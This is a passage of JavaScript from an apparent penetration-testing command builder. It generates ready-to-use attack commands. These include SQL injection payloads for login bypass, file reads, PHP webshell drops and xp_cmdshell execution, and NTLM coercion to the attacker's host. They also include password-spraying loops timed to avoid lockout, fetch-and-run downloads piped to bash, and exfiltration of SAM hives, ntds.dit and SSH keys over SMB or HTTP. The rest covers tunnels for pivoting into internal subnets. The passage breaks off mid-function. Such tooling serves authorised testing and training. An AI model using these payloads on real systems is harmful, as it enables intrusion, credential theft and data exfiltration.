      if (tool === 'wfuzz') return 'wfuzz -c -z file,' + path + ' --hc 404 "http://' + tgt + '/index.php?page=FUZZ"';
      if (tool === 'feroxbuster') return 'feroxbuster -u "http://' + tgt + '/index.php?page=FUZZ" -w ' + path + ' --no-state -t 40';
      return W.wordlistCmd(task, path, tgt, ext);
    }
    if (task === 'params') {
      if (tool === 'arjun') return 'arjun -u http://' + tgt + '/index.php -w ' + path;
      if (tool === 'wfuzz') return 'wfuzz -c -z file,' + path + ' -- hc 404,400 "http://' + tgt + '/index.php?FUZZ=test"'.replace('-- hc', '--hc');
      return W.wordlistCmd(task, path, tgt, ext);
    }
    if (task === 'subdomains') {
      if (tool === 'gobuster') return 'gobuster vhost -u http://' + tgt + '/ -w ' + path + ' --append-domain -t 40';
      if (tool === 'wfuzz') return 'wfuzz -c -w ' + path + ' -H "Host: FUZZ.' + tgt + '" --hc 400,404 http://' + tgt + '/';
      return 'ffuf -u http://' + tgt + '/ -H "Host: FUZZ.' + tgt + '" -w ' + path + ' -fs 0';
    }
    if (tool === 'ffuf') {
      return 'ffuf -u http://' + tgt + '/FUZZ -w ' + path + (dotExt ? (' -e ' + dotExt) : '') + ' -mc 200,204,301,302,307,401,403 -t 40';
    }
    if (tool === 'feroxbuster') {
      return 'feroxbuster -u http://' + tgt + '/ -w ' + path + (ext ? (' -x ' + ext) : '') + ' --no-state -t 40';
    }
    if (tool === 'dirsearch') {
      return 'dirsearch -u http://' + tgt + '/ -w ' + path + (ext ? (' -e ' + ext) : '');
    }
    return W.wordlistCmd(task, path, tgt, ext);
  };

  W.CUSTOM_WORDLIST_CMDS = [
    { label: 'CeWL: Spider Target Website for Custom Password Wordlist', note: 'Scrapes unique words from the target web app.', locus: 'kali$', cmd: 'cewl -d 2 -m 5 http://{{target}}/ -w custom-words.txt' },
    { label: 'Hashcat Rules: Mutate Custom Words with best64.rule', note: 'Turns a small company word list into a high-hit password candidate list.', locus: 'kali$', cmd: 'hashcat --stdout custom-words.txt -r /usr/share/hashcat/rules/best64.rule > mutated-passwords.txt' },
    { label: 'Username-Anarchy: Generate AD Username Permutations (j.doe, jdoe)', note: 'Builds candidate AD usernames from employee full names.', locus: 'kali$', cmd: 'username-anarchy -i names.txt > users.txt' },
  ];

  // ── Manual SQLi Extra Modes (Auth Bypass, Error/Blind, File Read & RCE) ─────────────────────
  W.sqliExtraPayloads = function (modeOrState, dbmsArg, lhostArg) {
    var mode = (typeof modeOrState === 'string') ? modeOrState : null;
    var state = (modeOrState && typeof modeOrState === 'object') ? modeOrState : { dbms: dbmsArg, lhost: lhostArg };
    var dbms = state.dbms || dbmsArg || 'mysql';
    var lhost = state.lhost || lhostArg || '{{lhost}}';
    var d = SQLI_DBMS[dbms] || SQLI_DBMS.mysql;
    var c = d.comment;
    var bypass = [
      { label: 'Classic True Bypass (Login Username or Password Field)', note: 'Evaluates to TRUE and returns the first row in the users table.', payload: "' OR 1=1" + c },
      { label: 'Target First Account / Admin Directly', note: 'Logs in specifically as the admin account without knowing the password.', payload: "admin'" + c },
      { label: 'Quote + Parenthesis Break Bypass', note: 'Breaks out of WHERE (\'user\'=\'$u\') grouped clauses.', payload: "') OR ('1'='1" + c },
      { label: 'Double-Quote Auth Bypass', note: 'Use when the SQL query wraps string literals in double quotes.', payload: '" OR "1"="1' + c },
    ];
    var blind = [];
    var rce = [];
    if (dbms === 'mysql') {
      blind = [
        { label: 'Error-Based Extraction (EXTRACTVALUE)', note: 'Leaks the database version inside the XPath syntax error message.', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))" + c },
        { label: 'Error-Based Extraction (UPDATEXML)', note: 'Leaks the current DB user inside an XML error message.', payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)" + c },
        { label: 'Boolean Blind Character Check', note: 'Tests whether the first character of the database name is "a".', payload: "' AND SUBSTRING((SELECT database()),1,1)='a'" + c },
        { label: 'Conditional Time-Delay Check (5s if root)', note: 'Sleeps 5 seconds only when the DB user starts with root.', payload: "' AND IF(LEFT(user(),4)='root',SLEEP(5),0)" + c },
      ];
      rce = [
        { label: 'Read Local File via LOAD_FILE (requires FILE privilege)', note: 'Reads /etc/passwd into a visible UNION column.', payload: "' UNION SELECT 1,LOAD_FILE('/etc/passwd')" + c },
        { label: 'Write PHP Webshell via INTO OUTFILE (requires secure_file_priv="")', note: 'Drops a minimal ?c= webshell into the Apache/Nginx web root.', payload: "' UNION SELECT 1,'<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'" + c },
      ];
    } else if (dbms === 'mssql') {
      blind = [
        { label: 'Error-Based Conversion Leak (CAST to INT)', note: 'Forces SQL Server to leak @@version inside a type conversion error.', payload: "' AND 1=CAST((SELECT @@version) AS INT)" + c },
        { label: 'Error-Based Database Name Leak', note: 'Leaks the current database name via CONVERT error.', payload: "' AND 1=CONVERT(INT,DB_NAME())" + c },
        { label: 'Conditional Time-Delay if sysadmin', note: 'Pauses 5 seconds if the current login holds the sysadmin role.', payload: "'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'" + c },
      ];
      rce = [
        { label: 'Enable xp_cmdshell via Stacked Query', note: 'Re-enables xp_cmdshell when connected as sysadmin.', payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE" + c },
        { label: 'Execute OS Command via xp_cmdshell', note: 'Runs a PowerShell encoded command as the SQL Server service account.', payload: "'; EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64>'" + c },
        { label: 'Coerce NetNTLMv2 Authentication to Kali SMB Server', note: 'Catch with Responder or impacket-smbserver on Kali (' + lhost + ').', payload: "'; EXEC master..xp_dirtree '\\\\" + lhost + "\\share'" + c },
      ];
    } else if (dbms === 'postgres') {
      blind = [
        { label: 'Error-Based Cast Leak', note: 'Leaks PostgreSQL version inside an integer conversion error.', payload: "' AND 1=CAST((SELECT version()) AS INT)" + c },
        { label: 'Conditional Time-Delay if superuser', note: 'Sleeps 5 seconds if current_setting("is_superuser") is on.', payload: "'; SELECT CASE WHEN (SELECT current_setting('is_superuser'))='on' THEN pg_sleep(5) ELSE pg_sleep(0) END" + c },
      ];
      rce = [
        { label: 'Read Local File via pg_read_file (superuser)', note: 'Reads /etc/passwd directly from disk.', payload: "' UNION SELECT 1,pg_read_file('/etc/passwd',0,10000)" + c },
        { label: 'Execute OS Command via COPY FROM PROGRAM (PostgreSQL 9.3+)', note: 'Runs OS commands when the DB role holds superuser or pg_execute_server_program.', payload: "'; DROP TABLE IF EXISTS cmd_out; CREATE TABLE cmd_out(t text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out" + c },
      ];
    } else {
      blind = [
        { label: 'Boolean Blind Table Name Check (SQLite)', note: 'Checks the first character of the first table name in sqlite_master.', payload: "' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u'" + c },
      ];
      rce = [
        { label: 'Dump Full CREATE TABLE Schema from sqlite_master', note: 'Extracts column names and types without information_schema.', payload: "' UNION SELECT 1,sql FROM sqlite_master WHERE type='table'" + c },
        { label: 'Attach Database Webshell in Web Root (if stacked queries work)', note: 'Creates a new SQLite DB file inside the web root containing PHP code.', payload: "'; ATTACH DATABASE '/var/www/html/cmd.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn VALUES ('<?php system($_GET[\"c\"]); ?>')" + c },
      ];
    }
    if (mode === 'auth_bypass' || mode === 'bypass') return bypass;
    if (mode === 'error_blind' || mode === 'blind') return blind;
    if (mode === 'file_rce' || mode === 'rce') return rce;
    return { bypass: bypass, blind: blind, rce: rce };
  };

  // ── Spray Planner Command Generator ─────────────────────────────────────────────────────────
  W.sprayCommands = function (opts) {
    opts = opts || {};
    var target = opts.target || '{{target}}';
    var domain = opts.domain || '{{domain}}';
    var pass = opts.password || 'Autumn2026!';
    var userFile = opts.userFile || 'users.txt';
    var safePass = String(pass).replace(/'/g, "'\\''");
    var safeCount = opts.safePerWindow || 3;
    var waitSec = Math.round((opts.windowMin || 30) * 60);
    return [
      { label: 'NetExec SMB Single-Password Spray (Recommended)', locus: 'kali$', cmd: "nxc smb " + target + " -u " + userFile + " -p '" + safePass + "' -d " + domain + " --continue-on-success" },
      { label: 'Kerbrute Kerberos Pre-Auth Spray (Fast & Quiet on Event 4625)', locus: 'kali$', cmd: "kerbrute passwordspray -d " + domain + " --dc " + target + " " + userFile + " '" + safePass + "'" },
      { label: 'NetExec WinRM Spray (Check Remote Management Access)', locus: 'kali$', cmd: "nxc winrm " + target + " -u " + userFile + " -p '" + safePass + "' -d " + domain },
      { label: 'Lockout-Safe Multi-Round Loop (' + safeCount + ' Passwords / ' + (opts.windowMin || 30) + 'm Cool-Down)', locus: 'kali$', cmd: "i=0; while IFS= read -r p; do nxc smb " + target + " -u " + userFile + " -p \"$p\" -d " + domain + " --continue-on-success; i=$((i+1)); if [ $((i % " + safeCount + ")) -eq 0 ]; then echo \"[*] Sleeping " + (opts.windowMin || 30) + "m for lockout reset...\"; sleep " + waitSec + "; fi; done < passwords.txt" },
    ];
  };

  // ── Scenario-First File Transfer & Exfil Builder ────────────────────────────────────────────
  var _FT_LINUX = [
    { name: 'linpeas.sh', file: 'linpeas.sh', label: 'linpeas.sh', dest: '/dev/shm/linpeas.sh', exec: true },
    { name: 'pspy64', file: 'pspy64', label: 'pspy64 (Cron Monitor)', dest: '/dev/shm/pspy64', exec: true },
    { name: 'chisel', file: 'chisel', label: 'chisel (Linux)', dest: '/dev/shm/chisel', exec: true },
    { name: 'agent', file: 'agent', label: 'ligolo-agent', dest: '/dev/shm/agent', exec: true },
    { name: 'exploit.sh', file: 'exploit.sh', label: 'exploit.sh', dest: '/dev/shm/exploit.sh', exec: true },
  ];
  var _FT_WIN = [
    { name: 'winPEASx64.exe', file: 'winPEASx64.exe', label: 'winPEASx64.exe', dest: 'C:\\Windows\\Temp\\winPEASx64.exe', exec: false },
    { name: 'nc64.exe', file: 'nc64.exe', label: 'nc64.exe', dest: 'C:\\Windows\\Temp\\nc64.exe', exec: false },
    { name: 'GodPotato.exe', file: 'GodPotato.exe', label: 'GodPotato.exe', dest: 'C:\\Windows\\Temp\\GodPotato.exe', exec: false },
    { name: 'RunasCs.exe', file: 'RunasCs.exe', label: 'RunasCs.exe', dest: 'C:\\Windows\\Temp\\RunasCs.exe', exec: false },
    { name: 'SharpHound.exe', file: 'SharpHound.exe', label: 'SharpHound.exe', dest: 'C:\\Windows\\Temp\\SharpHound.exe', exec: false },
    { name: 'chisel.exe', file: 'chisel.exe', label: 'chisel.exe', dest: 'C:\\Windows\\Temp\\chisel.exe', exec: false },
  ];
  var _FT_EXFIL = [
    { name: 'id_rsa', file: 'id_rsa', label: 'id_rsa (SSH Key)', dest: './id_rsa', exec: false },
    { name: 'loot.zip', file: 'loot.zip', label: 'loot.zip (SharpHound / Backup)', dest: './loot.zip', exec: false },
    { name: 'sam.save', file: 'sam.save', label: 'sam.save (Registry Hive)', dest: './sam.save', exec: false },
    { name: 'ntds.dit', file: 'ntds.dit', label: 'ntds.dit (AD Database)', dest: './ntds.dit', exec: false },
  ];
  W.FILE_TRANSFER_PRESETS = {
    'kali-to-linux': _FT_LINUX,
    'linux-in': _FT_LINUX,
    'kali-to-win': _FT_WIN,
    'win-in': _FT_WIN,
    'exfil-to-kali': _FT_EXFIL,
    'exfil': _FT_EXFIL
  };

  W.buildFileTransfer = function (opts) {
    opts = opts || {};
    var rawDir = opts.direction || 'kali-to-linux';
    var dir = (rawDir === 'kali-to-win' || rawDir === 'win-in') ? 'kali-to-win'
      : ((rawDir === 'exfil-to-kali' || rawDir === 'exfil') ? 'exfil-to-kali' : 'kali-to-linux');
    var lhost = opts.lhost || '{{lhost}}';
    var port = opts.httpPort || opts.port || '8000';
    var file = (opts.filename || opts.file || (dir === 'kali-to-win' ? 'winPEASx64.exe' : (dir === 'exfil-to-kali' ? 'loot.zip' : 'linpeas.sh'))).trim();
    var baseName = file.split(/[\\/]/).pop() || file;
    var dest = opts.dest || (dir === 'kali-to-win' ? ('C:\\Windows\\Temp\\' + baseName) : (dir === 'exfil-to-kali' ? ('./' + baseName) : ('/dev/shm/' + baseName)));
    var methods = [];

    if (dir === 'kali-to-linux') {
      var chmod = /\.(?:txt|conf|json|xml|sql)$/i.test(baseName) ? '' : (' && chmod +x ' + dest);
      methods.push({
        id: 'http-linux', recommended: true, badge: 'Recommended', label: '1. Python HTTP Server + curl / wget', title: '1. Python HTTP Server + curl / wget',
        note: 'Run Step 1 in the Kali folder containing ' + baseName + ', then paste Step 2 into the target shell.',
        kaliCmd: 'python3 -m http.server ' + port,
        targetCmd: 'curl -fsSL http://' + lhost + ':' + port + '/' + baseName + ' -o ' + dest + chmod,
        targetLocus: 'target$',
        step1: { locus: 'kali$', label: 'Step 1: Serve the directory on Kali', cmd: 'python3 -m http.server ' + port },
        step2: { locus: 'target$', label: 'Step 2: Download into /dev/shm on Target', cmd: 'curl -fsSL http://' + lhost + ':' + port + '/' + baseName + ' -o ' + dest + chmod },
        alts: [
          { locus: 'target$', label: 'Alternative: wget (if curl is missing)', cmd: 'wget -q http://' + lhost + ':' + port + '/' + baseName + ' -O ' + dest + chmod },
          { locus: 'target$', label: 'Alternative: Fileless in-memory execution (for .sh scripts)', cmd: 'curl -fsSL http://' + lhost + ':' + port + '/' + baseName + ' | bash' },
        ]
      });
      methods.push({
        id: 'b64-linux', recommended: false, badge: 'Zero Network', label: '2. Base64 Copy-Paste (Works Without Egress)', title: '2. Base64 Copy-Paste (Works Without Egress)',
        note: 'Use when outbound HTTP/SMB is blocked by a firewall. Encodes the file into terminal text you can paste directly.',
        kaliCmd: 'base64 -w 0 ' + baseName + '; echo',
        targetCmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + dest + chmod,
        targetLocus: 'target$',
        step1: { locus: 'kali$', label: 'Step 1: Base64-encode the file on Kali', cmd: 'base64 -w 0 ' + baseName + '; echo' },
        step2: { locus: 'target$', label: 'Step 2: Decode on Target', cmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + dest + chmod },
        alts: []
      });
      methods.push({
        id: 'scp-linux', recommended: false, badge: 'SSH Available', label: '3. Direct SCP Push Over SSH', title: '3. Direct SCP Push Over SSH',
        note: 'If you already have SSH credentials or a private key on the target.',
        kaliCmd: 'scp ' + baseName + ' ' + (opts.user || 'root') + '@' + (opts.targetIp || opts.target || '{{target}}') + ':' + dest,
        targetCmd: 'chmod +x ' + dest,
        targetLocus: 'target$',
        step1: { locus: 'kali$', label: 'Step 1: Push directly from Kali via scp', cmd: 'scp ' + baseName + ' ' + (opts.user || 'root') + '@' + (opts.targetIp || opts.target || '{{target}}') + ':' + dest },
        step2: { locus: 'target$', label: 'Step 2: Make executable on Target', cmd: 'chmod +x ' + dest },
        alts: []
      });
    } else if (dir === 'kali-to-win') {
      methods.push({
        id: 'http-win', recommended: true, badge: 'Recommended', label: '1. Python HTTP Server + PowerShell IWR', title: '1. Python HTTP Server + PowerShell / certutil',
        note: 'Run Step 1 in the Kali folder containing ' + baseName + ', then run Step 2 in PowerShell on Windows.',
        kaliCmd: 'python3 -m http.server ' + port,
        targetCmd: 'iwr -Uri http://' + lhost + ':' + port + '/' + baseName + ' -OutFile ' + dest + ' -UseBasicParsing',
        targetLocus: 'PS C:\\>',
        step1: { locus: 'kali$', label: 'Step 1: Serve the directory on Kali', cmd: 'python3 -m http.server ' + port },
        step2: { locus: 'PS C:\\>', label: 'Step 2: Download to C:\\Windows\\Temp on Target', cmd: 'iwr -Uri http://' + lhost + ':' + port + '/' + baseName + ' -OutFile ' + dest + ' -UseBasicParsing' },
        alts: []
      });
      methods.push({
        id: 'certutil-win', recommended: false, badge: 'Plain cmd.exe', label: '2. Python HTTP Server + certutil / curl.exe', title: '2. Python HTTP Server + certutil / curl.exe',
        note: 'Works directly from a basic cmd.exe shell without spawning PowerShell.',
        kaliCmd: 'python3 -m http.server ' + port,
        targetCmd: 'certutil.exe -urlcache -split -f http://' + lhost + ':' + port + '/' + baseName + ' ' + dest,
        targetLocus: 'C:\\>',
        step1: { locus: 'kali$', label: 'Step 1: Serve the directory on Kali', cmd: 'python3 -m http.server ' + port },
        step2: { locus: 'C:\\>', label: 'Step 2: Download via certutil.exe', cmd: 'certutil.exe -urlcache -split -f http://' + lhost + ':' + port + '/' + baseName + ' ' + dest },
        alts: []
      });
      methods.push({
        id: 'smb-win', recommended: false, badge: 'No Disk Write Option', label: '3. Impacket SMB Share (Copy or Run From \\\\UNC)', title: '3. Impacket SMB Share (Copy or Execute Directly Over UNC)',
        note: 'Ideal for Windows: you can either copy the binary or run it directly from \\\\' + lhost + '\\share\\' + baseName + ' without writing it to C:\\.',
        kaliCmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'",
        targetCmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy Z:\\" + baseName + " " + dest,
        targetLocus: 'C:\\>',
        step1: { locus: 'kali$', label: 'Step 1: Start SMB share on Kali', cmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'" },
        step2: { locus: 'C:\\>', label: 'Step 2: Copy or execute from UNC share', cmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy Z:\\" + baseName + " " + dest },
        alts: []
      });
      methods.push({
        id: 'b64-win', recommended: false, badge: 'Zero Network', label: '4. PowerShell Base64 Copy-Paste (Firewalled)', title: '4. PowerShell Base64 Copy-Paste',
        note: 'Works even when outbound HTTP and SMB are completely firewalled.',
        kaliCmd: 'base64 -w 0 ' + baseName + '; echo',
        targetCmd: '[IO.File]::WriteAllBytes("' + dest + '", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))',
        targetLocus: 'PS C:\\>',
        step1: { locus: 'kali$', label: 'Step 1: Base64-encode on Kali', cmd: 'base64 -w 0 ' + baseName + '; echo' },
        step2: { locus: 'PS C:\\>', label: 'Step 2: Decode bytes to disk on Target', cmd: '[IO.File]::WriteAllBytes("' + dest + '", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))' },
        alts: []
      });
    } else {
      methods.push({
        id: 'smb-exfil', recommended: true, badge: 'Recommended for Windows', label: '1. Exfiltrate Over Impacket SMB Share', title: '1. Exfiltrate Over Impacket SMB Share',
        note: 'Fastest way to pull BloodHound zips, registry hives (sam.save/system.save), or documents off a Windows box.',
        kaliCmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'",
        targetCmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy " + file + " Z:\\" + baseName,
        targetLocus: 'C:\\>',
        step1: { locus: 'kali$', label: 'Step 1: Start writable SMB share on Kali', cmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'" },
        step2: { locus: 'C:\\>', label: 'Step 2: Copy file from Target to Kali', cmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy " + file + " Z:\\" + baseName },
        alts: []
      });
      methods.push({
        id: 'http-exfil', recommended: false, badge: 'Recommended for Linux', label: '2. HTTP Upload Server / POST Exfil', title: '2. HTTP Upload Server / POST Exfil',
        note: 'Exfiltrate files over HTTP port ' + port + ' from Linux or Windows.',
        kaliCmd: 'python3 -m uploadserver ' + port,
        targetCmd: 'curl -X POST http://' + lhost + ':' + port + '/upload -F "files=@' + file + '"',
        targetLocus: 'target$',
        step1: { locus: 'kali$', label: 'Step 1: Start Python uploadserver on Kali', cmd: 'python3 -m uploadserver ' + port },
        step2: { locus: 'target$', label: 'Step 2: Upload file via curl', cmd: 'curl -X POST http://' + lhost + ':' + port + '/upload -F "files=@' + file + '"' },
        alts: []
      });
      methods.push({
        id: 'b64-exfil', recommended: false, badge: 'Zero Network', label: '3. Base64 Terminal Copy-Out', title: '3. Base64 Terminal Copy-Out',
        note: 'Print the file as single-line Base64 in your shell, copy the text, and decode it on Kali.',
        kaliCmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + baseName,
        targetCmd: 'base64 -w 0 ' + file + '; echo',
        targetLocus: 'target$',
        step1: { locus: 'target$', label: 'Step 1 (Linux): Print Base64 in target shell', cmd: 'base64 -w 0 ' + file + '; echo' },
        step2: { locus: 'kali$', label: 'Step 2: Decode on Kali', cmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + baseName },
        alts: []
      });
    }
    return { direction: dir, file: file, baseName: baseName, dest: dest, destPath: dest, lhost: lhost, port: port, methods: methods };
  };

  // ── Scenario-First Pivoting, Port-Forward & Tunnel Builder ──────────────────────────────────
  W.PIVOT_SCENARIOS = [
    {
      id: 'local-forward',
      shortTitle: '1. Reach a 127.0.0.1 Localhost Port',
      title: '1. Reach a 127.0.0.1 Localhost Port on This Box',
      badge: 'Local Port Forward',
      desc: 'ss -tlnp or netstat -ano showed a service (8080, 3306, 5432, 5985) bound to 127.0.0.1 that Kali cannot reach directly.',
      summary: 'ss -tlnp or netstat -ano showed a service (like 8080, 3306, 5432, 5985) bound to 127.0.0.1 that Kali cannot reach directly.',
      fieldLabel: 'Hidden Localhost Port on Target',
      inputLabel: 'Hidden Localhost Port on Target',
      defaultInput: '8080',
      presets: ['8080', '3306', '5432', '5985', '6379', '8443', '9000']
    },
    {
      id: 'subnet-route',
      shortTitle: '2. Route Into a Hidden Internal Subnet',
      title: '2. Route Into a Hidden Internal Subnet',
      badge: 'Full Subnet Pivot',
      desc: 'ip a or ipconfig revealed a second network interface (172.16.5.0/24 or 10.10.20.0/24) behind the compromised pivot host.',
      summary: 'ip a or ipconfig revealed a second network interface (like 172.16.5.0/24 or 10.10.20.0/24) behind the compromised pivot host.',
      fieldLabel: 'Internal Subnet CIDR',
      inputLabel: 'Internal Subnet CIDR',
      defaultInput: '172.16.5.0/24',
      presets: ['172.16.5.0/24', '10.10.20.0/24', '192.168.100.0/24']
    },
    {
      id: 'reverse-relay',
      shortTitle: '3. Catch a Reverse Shell Through Pivot Host',
      title: '3. Catch a Reverse Shell Through the Pivot Host',
      badge: 'Reverse Port Relay',
      desc: 'An internal box cannot reach your Kali VPN IP directly, so its reverse shell or HTTP request must bounce through the Pivot Host.',
      summary: 'An internal box cannot reach your Kali VPN IP directly, so its reverse shell or HTTP download must bounce through the Pivot Host.',
      fieldLabel: 'Pivot Host Internal IP',
      inputLabel: 'Pivot Host Internal IP',
      defaultInput: '172.16.5.10',
      presets: ['172.16.5.10', '10.10.20.10', '192.168.100.10']
    }
  ];

  W.buildPivotPlan = function (opts) {
    opts = opts || {};
    var rawScen = opts.scenario || 'local-forward';
    var scenario = (rawScen === 'local-port') ? 'local-forward' : ((rawScen === 'subnet') ? 'subnet-route' : rawScen);
    var tool = opts.tool || (scenario === 'subnet-route' ? 'ligolo' : 'chisel');
    var lhost = opts.lhost || '{{lhost}}';
    var target = opts.pivotIp || opts.target || '{{target}}';
    var user = opts.user || 'root';
    var chiselPort = opts.chiselPort || '8000';
    var socksPort = opts.socksPort || '1080';
    var steps = [];
    var note = '';

    if (scenario === 'local-forward') {
      var rport = (opts.rport || opts.value || '8080').trim();
      var lport = (opts.lport || rport).trim();
      if (tool === 'ssh') {
        note = 'Zero binaries needed on target: forwards Kali 127.0.0.1:' + lport + ' directly to Target 127.0.0.1:' + rport + ' over SSH.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Open SSH Local Port Forward from Kali', label: 'Step 1: Open SSH local port forward from Kali', note: 'Binds 127.0.0.1:' + lport + ' on Kali and tunnels to 127.0.0.1:' + rport + ' on ' + target + '.', cmd: 'ssh -N -L 127.0.0.1:' + lport + ':127.0.0.1:' + rport + ' ' + user + '@' + target },
          { locus: 'kali$', title: 'Step 2: Access the Service Locally on Kali', label: 'Step 2: Access the internal service locally on Kali', note: 'Point your browser, curl, or database client at 127.0.0.1:' + lport + '.', cmd: 'curl -i http://127.0.0.1:' + lport + '/' },
        ];
      } else if (tool === 'ligolo') {
        note = 'Ligolo-ng special CIDR 240.0.0.1/32 routes directly to the Pivot Host own 127.0.0.1 loopback without proxychains.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Create ligolo TUN Interface & Start Proxy on Kali', label: 'Step 1: Create ligolo TUN interface & start proxy on Kali', note: 'Run once on Kali to listen on TCP 11601.', cmd: 'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:11601' },
          { locus: 'target$', title: 'Step 2: Connect ligolo Agent from Target Back to Kali', label: 'Step 2: Connect ligolo agent from Target back to Kali', note: 'Establishes the encrypted tunnel.', cmd: './agent -connect ' + lhost + ':11601 -ignore-cert' },
          { locus: 'kali$', title: 'Step 3: Route 240.0.0.1/32 to Target Loopback & Hit Port ' + rport, label: 'Step 3: Add the 240.0.0.1 loopback route & hit port ' + rport, note: 'In ligolo console select session and run start, then access 240.0.0.1:' + rport + '.', cmd: 'sudo ip route add 240.0.0.1/32 dev ligolo && curl -i http://240.0.0.1:' + rport + '/' },
        ];
      } else {
        note = 'Works from any reverse/web shell (no SSH required). Tunnels Target 127.0.0.1:' + rport + ' back to Kali 127.0.0.1:' + lport + '.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Start Chisel Reverse Server on Kali', label: 'Step 1: Start Chisel reverse server on Kali', note: 'Listens on port ' + chiselPort + ' for the target Chisel client.', cmd: 'chisel server -p ' + chiselPort + ' --reverse' },
          { locus: 'target$', title: 'Step 2: Connect Chisel Client from Target', label: 'Step 2: Connect Chisel client from Target to forward port ' + rport, note: 'Forwards Kali 127.0.0.1:' + lport + ' into Target 127.0.0.1:' + rport + '.', cmd: './chisel client ' + lhost + ':' + chiselPort + ' R:' + lport + ':127.0.0.1:' + rport },
          { locus: 'kali$', title: 'Step 3: Access the Hidden Service on Kali Localhost', label: 'Step 3: Access the service on Kali localhost:' + lport, note: 'Connect to 127.0.0.1:' + lport + ' from Kali.', cmd: 'curl -i http://127.0.0.1:' + lport + '/' },
        ];
      }
    } else if (scenario === 'subnet-route') {
      var subnet = (opts.subnet || opts.value || '172.16.5.0/24').trim();
      if (tool === 'ligolo') {
        note = 'Recommended for internal subnets: creates a real Linux TUN interface so Nmap, NetExec, and Impacket work natively without proxychains.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Create ligolo TUN Interface & Route ' + subnet, label: 'Step 1: Create ligolo TUN interface & route ' + subnet, note: 'Sets up the ligolo interface and routes ' + subnet + ' through it.', cmd: 'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && sudo ip route add ' + subnet + ' dev ligolo && ./proxy -selfcert -laddr 0.0.0.0:11601' },
          { locus: 'target$', title: 'Step 2: Connect ligolo Agent on Pivot Host', label: 'Step 2: Run ligolo agent on Pivot Host', note: 'In the ligolo proxy console, select the session and type: start', cmd: './agent -connect ' + lhost + ':11601 -ignore-cert' },
          { locus: 'kali$', title: 'Step 3: Scan / Attack Internal Subnet Directly (No Proxychains)', label: 'Step 3: Scan or attack internal subnet directly from Kali', note: 'All TCP tools talk directly to ' + subnet + ' through the TUN interface.', cmd: 'nxc smb ' + subnet },
        ];
      } else if (tool === 'ssh') {
        note = 'Instant SOCKS5 proxy over SSH (-D ' + socksPort + '). Pair with proxychains4 -q for all TCP tools.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Start Dynamic SOCKS5 Proxy Over SSH', label: 'Step 1: Start dynamic SOCKS5 proxy over SSH', note: 'Opens SOCKS5 proxy on Kali 127.0.0.1:' + socksPort + '.', cmd: 'ssh -N -D 127.0.0.1:' + socksPort + ' ' + user + '@' + target },
          { locus: 'kali$', title: 'Step 2: Verify /etc/proxychains4.conf Points to socks5 127.0.0.1 ' + socksPort, label: 'Step 2: Ensure /etc/proxychains4.conf ends with socks5 127.0.0.1 ' + socksPort, note: 'Make sure socks5 127.0.0.1 ' + socksPort + ' is set at the bottom of /etc/proxychains4.conf.', cmd: 'tail -n 3 /etc/proxychains4.conf' },
          { locus: 'kali$', title: 'Step 3: Run Tools Through proxychains4', label: 'Step 3: Run tools through proxychains (-sT -Pn required for Nmap)', note: 'Prefix any TCP command with proxychains4 -q.', cmd: 'proxychains4 -q nxc smb ' + subnet },
        ];
      } else {
        note = 'Chisel Reverse SOCKS5 proxy on 127.0.0.1:' + socksPort + '. Works from any shell without SSH.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Start Chisel Reverse Server on Kali', label: 'Step 1: Start Chisel reverse server on Kali', note: 'Listens on port ' + chiselPort + ' and opens SOCKS5 on 127.0.0.1:1080.', cmd: 'chisel server -p ' + chiselPort + ' --reverse' },
          { locus: 'target$', title: 'Step 2: Connect Chisel SOCKS Client from Pivot Host', label: 'Step 2: Connect Chisel SOCKS client from Pivot Host', note: 'Creates the reverse SOCKS5 tunnel back to Kali.', cmd: './chisel client ' + lhost + ':' + chiselPort + ' R:socks' },
          { locus: 'kali$', title: 'Step 3: Scan Internal Subnet via proxychains4', label: 'Step 3: Run tools via proxychains4 (socks5 127.0.0.1 ' + socksPort + ')', note: 'Always use -sT -Pn with Nmap over SOCKS.', cmd: 'proxychains4 -q nmap -sT -Pn --top-ports 50 ' + subnet },
        ];
      }
    } else {
      var pivIp = (opts.internalIp || opts.value || '172.16.5.10').trim();
      var rPort = (opts.lport || '4444').trim();
      if (tool === 'ligolo') {
        note = 'Ligolo-ng listener_add binds port ' + rPort + ' on the Pivot Host and forwards incoming reverse shells straight to your Kali listener.';
        steps = [
